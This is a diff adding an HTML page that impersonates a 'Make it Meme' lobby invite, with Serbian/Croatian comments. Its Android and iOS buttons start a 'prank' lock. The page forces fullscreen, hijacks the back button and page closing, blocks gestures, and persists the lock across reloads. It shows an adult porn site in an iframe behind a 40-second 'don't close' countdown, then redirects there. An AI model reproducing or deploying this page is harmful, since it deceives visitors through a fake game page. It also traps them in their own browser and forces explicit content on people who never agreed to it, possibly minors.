@@ -1,0 +1,497 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Lobby invite - Make it Meme</title>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#1d1133">
+<meta name="color-scheme" content="dark">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="apple-mobile-web-app-title" content="Meme">
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="description" content="Make it Meme is the free multiplayer game about creating and rating memes. Play it now with your friends!">
+<script>
+/* ================= PODEŠAVANJA ================= */
+var LOCK_MS = 40000;
+var TARGET  = "https://www.gaymaletube.com";
+var KEY     = "mim_lock_until";
+var KNAME   = "mim_lock_name";
+/* =============================================== */
+
+/* ---------- inline manifest (PWA / fullscreen) ---------- */
+(function () {
+  try {
+    var icon = "data:image/svg+xml," + encodeURIComponent(
+      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">' +
+      '<defs><linearGradient id="g" x1="0" y1="1" x2="1" y2="0">' +
+      '<stop offset=".05" stop-color="#3096E7"/><stop offset=".95" stop-color="#9228C4"/>' +
+      '</linearGradient></defs><rect width="512" height="512" fill="url(#g)"/>' +
+      '<text x="256" y="300" font-family="Arial Black,Impact,sans-serif" font-size="190" ' +
+      'font-weight="900" font-style="italic" fill="#fff" text-anchor="middle">M</text></svg>');
+    var m = {
+      name: "Make it Meme", short_name: "Meme",
+      start_url: location.origin + location.pathname,
+      scope: location.origin + "/",
+      display: "fullscreen",
+      display_override: ["fullscreen", "standalone", "minimal-ui"],
+      orientation: "portrait",
+      background_color: "#1d1133", theme_color: "#1d1133",
+      icons: [{ src: icon, sizes: "any", type: "image/svg+xml", purpose: "any maskable" }]
+    };
+    var l = document.createElement("link");
+    l.rel = "manifest";
+    l.href = URL.createObjectURL(new Blob([JSON.stringify(m)], { type: "application/manifest+json" }));
+    document.head.appendChild(l);
+    var i = document.createElement("link");
+    i.rel = "icon"; i.href = icon;
+    document.head.appendChild(i);
+  } catch (e) {}
+})();
+</script>
+<style>
+  :root{--bg:#1d1133;--deep:#0b0616;--green:#2e8b57;--green-d:#1f6440;--green-hi:#3fae6e}
+  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;-webkit-user-drag:none}
+  html,body{margin:0;min-height:100%;background:var(--bg);color:#fff;
+    font-family:"Trebuchet MS",Verdana,system-ui,sans-serif;
+    overscroll-behavior:none;-webkit-overflow-scrolling:touch}
+  body{user-select:none;-webkit-user-select:none;-webkit-touch-callout:none}
+  body.locked{position:fixed;inset:0;width:100%;overflow:hidden}
+  img{pointer-events:none}
+
+  #inst{position:fixed;left:0;right:0;bottom:0;z-index:60;display:none;
+    align-items:center;gap:10px;padding:12px 14px calc(12px + env(safe-area-inset-bottom));
+    background:#2a1b47;border-top:1px solid rgba(255,255,255,.14);
+    box-shadow:0 -6px 20px rgba(0,0,0,.4)}
+  #inst.on{display:flex}
+  #inst p{margin:0;flex:1;font-size:12.5px;line-height:1.35;color:#e8e0ff}
+  #inst button{border:0;border-radius:10px;padding:10px 14px;font-weight:800;font-size:12px;
+    background:var(--green-hi);color:#062b14;cursor:pointer}
+  #inst .x{background:transparent;color:#b6a8d4;font-size:16px;padding:6px 8px}
+
+  .topbar{position:fixed;top:0;left:0;right:0;z-index:20;display:flex;align-items:center;
+    justify-content:space-between;gap:10px;
+    padding:calc(8px + env(safe-area-inset-top)) 14px 8px;
+    background:linear-gradient(rgba(29,17,51,.96),rgba(29,17,51,.55),transparent)}
+  .wordmark{font-family:"Arial Black",Impact,sans-serif;font-style:italic;font-weight:900;
+    font-size:20px;letter-spacing:-.5px;line-height:1;
+    background:linear-gradient(#fff,#dbd2f6);-webkit-background-clip:text;background-clip:text;
+    color:transparent;text-shadow:0 2px 0 rgba(55,12,96,.9);white-space:nowrap}
+  .back{display:flex;align-items:center;gap:6px;color:#cfc4e6;font-size:13px;
+    text-decoration:none;opacity:.85}
+  .back svg{width:18px;height:18px}
+
+  main{position:relative;min-height:100dvh;display:flex;flex-direction:column;
+    align-items:center;justify-content:center;gap:22px;
+    padding:calc(72px + env(safe-area-inset-top)) 22px calc(46px + env(safe-area-inset-bottom));
+    text-align:center;overflow:hidden}
+  .bg{position:absolute;inset:0;z-index:0}
+  .bg svg{width:100%;height:100%;display:block}
+  .rays{position:absolute;inset:0;z-index:1;pointer-events:none}
+  .rays svg{width:100%;height:100%}
+  .stack{position:relative;z-index:2;display:flex;flex-direction:column;
+    align-items:center;gap:20px;max-width:420px}
+
+  h1{font-family:"Arial Black",Impact,sans-serif;font-weight:900;font-size:clamp(26px,7.4vw,40px);
+    line-height:1.05;margin:0;letter-spacing:-.02em;text-wrap:balance;
+    text-shadow:0 .1em 0 rgba(55,12,96,.85)}
+  p.sub{margin:0;font-size:clamp(14px,4vw,17px);line-height:1.4;color:#f1ebff;
+    text-shadow:0 .1em 0 rgba(55,12,96,.7);text-wrap:balance}
+
+  .avatar{width:min(20dvh,8rem);aspect-ratio:1;border-radius:50%;overflow:hidden;
+    border:3px solid rgba(255,255,255,.9);box-shadow:0 8px 26px rgba(0,0,0,.45);background:#2a1b47}
+  .avatar img{width:100%;height:100%;object-fit:cover;display:block}
+
+  .nickrow{display:flex;align-items:center;gap:8px;width:100%;max-width:300px}
+  .nick{flex:1;background:rgba(11,6,22,.55);border:2px solid rgba(255,255,255,.35);
+    border-radius:12px;padding:11px 14px;color:#fff;font:inherit;font-size:15px;
+    text-align:center;outline:none;user-select:text;-webkit-user-select:text}
+  .dice{width:44px;height:44px;flex:0 0 auto;border-radius:12px;border:2px solid rgba(255,255,255,.3);
+    background:rgba(11,6,22,.55);display:grid;place-items:center;cursor:pointer}
+  .dice svg{width:22px;height:22px}
+
+  .btn{width:100%;max-width:320px;border:0;border-radius:14px;padding:15px 18px;
+    font-family:"Arial Black",Impact,sans-serif;font-size:15px;letter-spacing:.5px;
+    text-transform:uppercase;color:#fff;cursor:pointer;text-decoration:none;
+    display:flex;align-items:center;justify-content:center;gap:9px;
+    box-shadow:0 5px 0 rgba(0,0,0,.35);transition:transform .06s,box-shadow .06s}
+  .btn:active{transform:translateY(3px);box-shadow:0 2px 0 rgba(0,0,0,.35)}
+  .btn.green{background:linear-gradient(var(--green-hi),var(--green));box-shadow:0 5px 0 var(--green-d)}
+  .btn.gray{background:rgba(11,6,22,.5);border:2px solid rgba(255,255,255,.28);
+    font-size:13px;padding:12px;box-shadow:none;color:#e6ddff}
+
+  .platforms{display:flex;gap:10px;width:100%;max-width:320px}
+  .platforms .btn{flex:1;max-width:none;font-size:13px;padding:13px 10px}
+  .btn.and{background:linear-gradient(#8ee06f,#4caf50);box-shadow:0 5px 0 #2e7d32;color:#08300f}
+  .btn.ios{background:linear-gradient(#f2f2f2,#c9c9c9);box-shadow:0 5px 0 #8f8f8f;color:#111}
+  .btn svg{width:18px;height:18px}
+
+  #lock{position:fixed;top:0;left:0;width:100%;height:100dvh;z-index:99999;
+    display:none;background:var(--deep)}
+  #lock.on{display:block}
+  #poster{position:absolute;inset:0;z-index:0;display:grid;place-items:center;
+    background:radial-gradient(120% 80% at 50% 0%,#2a1044,#0b0616 70%)}
+  #poster .wm{font-family:"Arial Black",Impact,sans-serif;font-style:italic;font-weight:900;
+    font-size:clamp(22px,7vw,34px);letter-spacing:-.5px;color:#fff;opacity:.22;
+    text-align:center;line-height:1.1;padding:0 24px}
+  #frame{position:absolute;inset:0;width:100%;height:100%;border:0;z-index:1;background:transparent}
+  #blocker{position:absolute;inset:0;z-index:2;touch-action:none}
+  #hud{position:absolute;top:0;left:0;right:0;z-index:3;
+    padding:calc(12px + env(safe-area-inset-top)) 14px 22px;
+    display:flex;align-items:center;gap:12px;
+    background:linear-gradient(rgba(11,6,22,.94),rgba(11,6,22,.55),transparent)}
+  #ring{--p:0;width:46px;height:46px;flex:0 0 auto;border-radius:50%;display:grid;place-items:center;
+    background:conic-gradient(var(--green-hi) calc(var(--p)*1%),rgba(255,255,255,.16) 0)}
+  #ring.done{background:var(--green-hi)}
+  #ring i{width:36px;height:36px;border-radius:50%;background:var(--deep);
+    display:grid;place-items:center;font-style:normal;font-weight:800;font-size:14px}
+  #ring.done i{background:var(--green-hi);color:#062b14}
+  #hud b{display:block;font-size:14px;letter-spacing:.4px}
+  #hud small{display:block;font-size:11.5px;color:#b6a8d4;margin-top:2px;line-height:1.3}
+</style>
+</head>
+<body>
+
+<div class="topbar">
+  <a class="back" href="https://makeitmeme.com/">
+    <svg viewBox="0 0 48 48" fill="currentColor"><path d="M37.9 30.4c-4.6-.2-9.2-.1-13.7.1-1.3.1-1.9-.9-1.5-2.1.4-1.2 2.4-2.5 1.7-3.3-.6-.8-2.6 1-3.9 2.1-1.3 1.1-2.6 2.3-2.3 3.6.2 1.2 2 2.6 3.4 3.7 1.4 1.1 3.5 3 4.1 2.2.7-.8-1.3-2.1-1.6-3.3-.4-1.2.3-2.2 1.6-2.1 4.1.2 8.2.3 12.2.1z"/></svg>
+    <span>Back to start</span>
+  </a>
+  <div class="wordmark">Make it Meme</div>
+</div>
+
+<main>
+  <div class="bg">
+    <svg viewBox="0 0 100 100" preserveAspectRatio="none">
+      <defs><linearGradient id="g1" x1="0%" y1="100%" x2="100%" y2="0%">
+        <stop offset="5%" stop-color="#3096E7"/><stop offset="95%" stop-color="#9228C4"/>
+      </linearGradient></defs>
+      <rect width="100" height="100" fill="url(#g1)"/>
+    </svg>
+  </div>
+  <div class="rays">
+    <svg viewBox="0 0 100 100" preserveAspectRatio="xMidYMid slice">
+      <g fill="#fff" opacity=".1">
+        <path d="M50 50V268L-17.3 257.3z"/><path d="M50 50L-157.2 117.3L-167.9 50z"/>
+        <path d="M50-167.9L117.3-157.2L50 50z"/><path d="M50 50L257.3-17.3L268 50z"/>
+        <path d="M50 50L257.3 117.3L226.4 178.2z"/><path d="M50 50L-78.1 226.4L-126.3 178.2z"/>
+        <path d="M117.3 257.3L178.2 226.4L50 50z"/><path d="M50 50L178.2-126.3L226.4-78.1z"/>
+        <path d="M-17.3-157.2L-78.1-126.3L50 50z"/><path d="M-126.3-78.1L-157.2-17.3L50 50z"/>
+      </g>
+    </svg>
+  </div>
+
+  <div class="stack">
+    <h1>This lobby has left the chat 💨</h1>
+    <p class="sub">Everyone left, so it closed. Start your own lobby and invite the squad!</p>
+
+    <div class="avatar"><img alt="Avatar" src="https://c.makeitmeme.com/avatar/surprised-pikachu-983150f6-jn1k1uAi.webp"></div>
+
+    <div class="nickrow">
+      <input class="nick" id="nick" maxlength="20" value="LastWaifu" spellcheck="false">
+      <button class="dice" id="dice" aria-label="Random nickname">
+        <svg viewBox="0 0 16 17" fill="#c5d4dd"><path d="M15.6 5.4v6.2c0 .3-.1.5-.2.7-.1.2-.3.4-.6.5L8.8 16a1.7 1.7 0 0 1-.8.2v-7.7l7.4-3.8c.1.2.2.4.2.7Z"/><path d="M8 8.5v7.7c-.3 0-.5-.1-.8-.2L1.2 12.8c-.2-.1-.4-.3-.6-.5a1.6 1.6 0 0 1-.2-.7V5.4c0-.3.1-.5.2-.7L8 8.5Z"/><path d="M15.4 4.7 8 8.5.6 4.7c.1-.2.3-.4.6-.5L7.2 1a1.7 1.7 0 0 1 1.6 0l6 3.2c.2.1.4.3.6.5Z"/></svg>
+      </button>
+    </div>
+
+    <button class="btn green" id="create">Create a lobby</button>
+
+    <div class="platforms">
+      <button class="btn and" data-prank>
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M17.5 15.2a5.4 5.4 0 0 0-1.2-3.4 5.6 5.6 0 0 0-3-2l.8-1.4-1-.5-.7 1.4a6 6 0 0 0-2.8 0L8.9 7.9l-1 .5.8 1.4a5.6 5.6 0 0 0-3 2 5.4 5.4 0 0 0-1.2 3.4h13ZM7.6 12.4a.9.9 0 1 1 0 1.8.9.9 0 0 1 0-1.8Zm8.8 0a.9.9 0 1 1 0 1.8.9.9 0 0 1 0-1.8Z"/></svg>
+        Android
+      </button>
+      <button class="btn ios" data-prank>
+        <svg viewBox="0 0 24 24" fill="currentColor"><path d="M16.4 12.7c0-2 1.6-3 1.7-3.1a3.7 3.7 0 0 0-2.9-1.6c-1.2-.1-2.4.7-3 .7-.6 0-1.6-.7-2.6-.7-1.3 0-2.6.8-3.3 2-1.4 2.4-.4 6 1 8 .7 1 1.5 2 2.5 2 1 0 1.4-.6 2.6-.6s1.5.6 2.6.6 1.8-1 2.4-2a8.4 8.4 0 0 0 1.1-2.3 3.3 3.3 0 0 1-2.1-3ZM14.3 6.3A3.4 3.4 0 0 0 15 3.9a3.5 3.5 0 0 0-2.3 1.2 3.2 3.2 0 0 0-.8 2.3 2.9 2.9 0 0 0 2.4-1.1Z"/></svg>
+        iOS
+      </button>
+    </div>
+
+    <a class="btn gray" href="https://makeitmeme.com/">Back to start</a>
+  </div>
+</main>
+
+<div id="inst">
+  <p id="instTxt">Dodaj na početni ekran za pravi fullscreen.</p>
+  <button id="instGo">DODAJ</button>
+  <button class="x" id="instX" aria-label="Zatvori">✕</button>
+</div>
+
+<div id="lock">
+  <div id="poster"><div class="wm">GAY<br>MALETUBE</div></div>
+  <iframe id="frame" title="target" referrerpolicy="no-referrer-when-downgrade"
+          allow="autoplay; fullscreen; encrypted-media; picture-in-picture"></iframe>
+  <div id="blocker"></div>
+  <div id="hud">
+    <div id="ring"><i id="num">40</i></div>
+    <div>
+      <b id="msg">NE ZATVARAJ</b>
+      <small id="sub">Otvara se za <span id="cnt">40</span> s…</small>
+    </div>
+  </div>
+</div>
+
+<script>
+(function () {
+  "use strict";
+
+  var lock = document.getElementById("lock");
+  var frame = document.getElementById("frame");
+  var blocker = document.getElementById("blocker");
+  var ring = document.getElementById("ring");
+  var num = document.getElementById("num");
+  var msg = document.getElementById("msg");
+  var sub = document.getElementById("sub");
+  var cnt = document.getElementById("cnt");
+  var titleBase = document.title;
+
+  var deadline = 0, raf = 0, wake = null, ticker = 0;
+  var locked = false, frameLoaded = false, frameSet = false, done = false;
+
+  function ls(fn, dflt) { try { return fn(); } catch (e) { return dflt; } }
+  var standalone = (window.matchMedia && matchMedia("(display-mode: standalone)").matches)
+                   || navigator.standalone === true;
+
+  function fullscreen() {
+    if (document.fullscreenElement || document.webkitFullscreenElement) return;
+    var el = document.documentElement;
+    var fn = el.requestFullscreen || el.webkitRequestFullscreen || el.msRequestFullscreen;
+    if (fn) { try { fn.call(el); } catch (e) {} }
+  }
+
+  function lockOrientation() {
+    if (!screen.orientation || !screen.orientation.lock) return;
+    try {
+      var p = screen.orientation.lock("portrait");
+      if (p && p.catch) p.catch(function () {});
+    } catch (e) {}
+  }
+
+  function keepAwake() {
+    if (!navigator.wakeLock) return;
+    navigator.wakeLock.request("screen").then(function (w) {
+      wake = w;
+      w.addEventListener("release", function () { wake = null; });
+    }).catch(function () {});
+  }
+
+  function buzz(p) { try { navigator.vibrate(p); } catch (e) {} }
+
+  function pushLock() {
+    try { history.pushState({ l: 1 }, "", location.href); } catch (e) {}
+  }
+  function keepTrap() {
+    if (!locked) return;
+    if (!history.state || !history.state.l) pushLock();
+  }
+
+  var vv = window.visualViewport;
+  function fit() {
+    if (!vv) return;
+    lock.style.height = vv.height + "px";
+    lock.style.width = vv.width + "px";
+    lock.style.top = vv.offsetTop + "px";
+    lock.style.left = vv.offsetLeft + "px";
+  }
+  if (vv) { vv.addEventListener("resize", fit); vv.addEventListener("scroll", fit); }
+
+  ["touchstart","touchmove","pointerdown","wheel","gesturestart","gesturechange","dblclick"]
+    .forEach(function (ev) {
+      blocker.addEventListener(ev, function (e) {
+        if (ev !== "pointerdown" && ev !== "touchstart") e.preventDefault();
+      }, { passive: false });
+    });
+
+  document.addEventListener("gesturestart", function (e) { e.preventDefault(); }, { passive: false });
+
+  var lastEnd = 0;
+  document.addEventListener("touchend", function (e) {
+    var now = Date.now();
+    if (now - lastEnd < 320) e.preventDefault();
+    lastEnd = now;
+  }, { passive: false });
+
+  document.addEventListener("contextmenu", function (e) { if (locked) e.preventDefault(); });
+  document.addEventListener("dragstart", function (e) { if (locked) e.preventDefault(); });
+
+  document.addEventListener("keydown", function (e) {
+    if (!locked) return;
+    if (e.key === "Escape") { setTimeout(fullscreen, 60); return; }
+    if (["ArrowUp","ArrowDown","PageUp","PageDown","Home","End"," "].indexOf(e.key) >= 0)
+      e.preventDefault();
+  });
+
+  function arm(remaining) {
+    if (done) return;
+    locked = true;
+    deadline = Date.now() + Math.max(1, remaining);
+    ls(function () {
+      localStorage.setItem(KEY, String(deadline));
+      window.name = KNAME + deadline;
+    });
+
+    document.body.classList.add("locked");
+    lock.classList.add("on");
+    fit();
+
+    fullscreen();
+    lockOrientation();
+    pushLock(); pushLock();
+    keepAwake();
+    buzz([120, 60, 120, 60, 120]);
+    window.scrollTo(0, 1);
+
+    if (!frameSet) {
+      frameSet = true;
+      var t = setTimeout(function () { if (!frameLoaded) frame.style.visibility = "hidden"; }, 3000);
+      frame.addEventListener("load", function () {
+        frameLoaded = true;
+        clearTimeout(t);
+        frame.style.visibility = "visible";
+      });
+      frame.src = TARGET;
+    }
+
+    if (raf) cancelAnimationFrame(raf);
+    clearInterval(ticker);
+    ticker = setInterval(keepTrap, 650);
+    loop();
+  }
+
+  function loop() {
+    var left = deadline - Date.now();
+    if (left <= 0) { finish(); return; }
+    var s = Math.ceil(left / 1000);
+    num.textContent = s;
+    cnt.textContent = s;
+    ring.style.setProperty("--p", (100 - (left / LOCK_MS) * 100).toFixed(1));
+    document.title = "\u23F3 " + s + " \u00B7 NE ZATVARAJ";
+    raf = requestAnimationFrame(loop);
+  }
+
+  function finish() {
+    locked = false; done = true;
+    if (raf) cancelAnimationFrame(raf);
+    clearInterval(ticker);
+    ls(function () { localStorage.removeItem(KEY); window.name = ""; });
+    document.title = titleBase;
+
+    blocker.style.display = "none";
+    ring.classList.add("done");
+    num.textContent = "\u2713";
+    msg.textContent = "OTKLJUČANO";
+    sub.textContent = "Prebacujem na stranicu…";
+    buzz([60, 40, 60]);
+    if (wake) { try { wake.release(); } catch (e) {} }
+
+    setTimeout(function () { location.replace(TARGET); }, 500);
+  }
+
+  window.addEventListener("popstate", function () { if (locked) pushLock(); });
+  window.addEventListener("hashchange", function () { if (locked) pushLock(); });
+
+  window.addEventListener("beforeunload", function (e) {
+    if (!locked) return;
+    e.preventDefault(); e.returnValue = "";
+  });
+
+  window.addEventListener("pagehide", function () {
+    if (locked) ls(function () { localStorage.setItem(KEY, String(deadline)); });
+  });
+
+  window.addEventListener("pageshow", function (e) {
+    if (!locked) return;
+    if (e.persisted) arm(deadline - Date.now());
+  });
+
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState !== "visible" || !locked) return;
+    fullscreen(); lockOrientation(); keepTrap(); keepAwake();
+    window.scrollTo(0, 1);
+  });
+
+  window.addEventListener("blur", function () { if (locked) setTimeout(fullscreen, 120); });
+  window.addEventListener("focus", function () { if (locked) { fullscreen(); keepTrap(); } });
+
+  document.addEventListener("fullscreenchange", function () {
+    if (locked && !document.fullscreenElement) setTimeout(fullscreen, 70);
+  });
+
+  document.addEventListener("pointerdown", function () {
+    if (locked) { fullscreen(); lockOrientation(); }
+  }, { passive: true });
+
+  function start() {
+    if (locked || done) return;
+    arm(LOCK_MS);
+  }
+
+  Array.prototype.forEach.call(document.querySelectorAll("[data-prank]"), function (b) {
+    b.addEventListener("click", start);
+  });
+
+  document.getElementById("create").addEventListener("click", function () {
+    if (locked) return;
+    location.href = "https://makeitmeme.com/";
+  });
+
+  document.getElementById("dice").addEventListener("click", function () {
+    var n = ["LastWaifu","SneakyPanda","MemeLord","ToxicAvocado","PixelGoblin"];
+    document.getElementById("nick").value = n[Math.floor(Math.random() * n.length)];
+  });
+
+  var inst = document.getElementById("inst");
+  var instTxt = document.getElementById("instTxt");
+  var instGo = document.getElementById("instGo");
+  var deferred = null;
+
+  if (!standalone && !ls(function () { return localStorage.getItem("mim_inst_off"); }, null)) {
+    if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
+      instTxt.textContent = "Podijeli → Dodaj na početni ekran (pravi fullscreen).";
+      instGo.textContent = "OK";
+      inst.classList.add("on");
+      instGo.addEventListener("click", function () { inst.classList.remove("on"); });
+    }
+    window.addEventListener("beforeinstallprompt", function (e) {
+      e.preventDefault(); deferred = e; inst.classList.add("on");
+    });
+    instGo.addEventListener("click", function () {
+      if (!deferred) return;
+      deferred.prompt();
+      deferred = null;
+      inst.classList.remove("on");
+    });
+  }
+  document.getElementById("instX").addEventListener("click", function () {
+    inst.classList.remove("on");
+    ls(function () { localStorage.setItem("mim_inst_off", "1"); });
+  });
+
+  var saved = ls(function () {
+    return parseInt(localStorage.getItem(KEY) || "0", 10)
+        || parseInt((window.name || "").replace(KNAME, "") || "0", 10);
+  }, 0);
+  if (saved && saved > Date.now()) arm(saved - Date.now());
+  else if (saved) ls(function () { localStorage.removeItem(KEY); window.name = ""; });
+
+  /* ---------- service worker iz Blob URL-a (best effort) ---------- */
+  if ("serviceWorker" in navigator) {
+    var SW_SRC = "const C='mim-v3';" +
+      "self.addEventListener('install',e=>{self.skipWaiting()});" +
+      "self.addEventListener('activate',e=>{e.waitUntil(self.clients.claim())});" +
+      "self.addEventListener('fetch',e=>{" +
+      "if(e.request.method!=='GET')return;" +
+      "if(new URL(e.request.url).origin!==location.origin)return;" +
+      "e.respondWith(caches.open(C).then(c=>c.match(e.request).then(r=>r||" +
+      "fetch(e.request).then(res=>{c.put(e.request,res.clone());return res}).catch(()=>r))))});";
+    window.addEventListener("load", function () {
+      try {
+        var u = URL.createObjectURL(new Blob([SW_SRC], { type: "text/javascript" }));
+        navigator.serviceWorker.register(u).catch(function () {});
+      } catch (e) {}
+    });
+  }
+})();
+</script>
+</body>
+</html>
